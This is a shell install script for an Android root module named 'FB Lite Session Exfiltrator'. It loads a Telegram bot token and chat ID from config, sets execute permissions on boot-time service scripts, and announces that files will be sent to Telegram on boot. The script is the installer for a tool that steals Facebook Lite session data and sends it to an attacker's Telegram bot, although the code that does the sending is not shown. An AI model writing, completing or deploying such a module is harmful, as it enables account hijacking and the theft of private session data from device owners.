#!/system/bin/sh

# FB Lite Session Exfiltrator - Custom Install Script

MODPATH=${0%/*}

# Source config
. $MODPATH/config.sh

print_modname

# Validate configuration
if [ "$BOT_TOKEN" = "YOUR_BOT_TOKEN_HERE" ] || [ "$CHAT_ID" = "YOUR_CHAT_ID_HERE" ]; then
  ui_print "⚠️  WARNING: You did not configure BOT_TOKEN and CHAT_ID!"
  ui_print "   Edit config.sh and reflash, or the module won't work."
fi

# Extract common files
ui_print "- Extracting module files"
unzip -o "$ZIPFILE" 'common/*' -d $MODPATH >&2

# Set execute permissions
set_perm_recursive $MODPATH 0 0 0755 0644
set_perm $MODPATH/common/service.sh 0 0 0755
set_perm $MODPATH/common/post-fs-data.sh 0 0 0755

ui_print "- Installation complete"
ui_print "- Files will be sent to Telegram on boot"
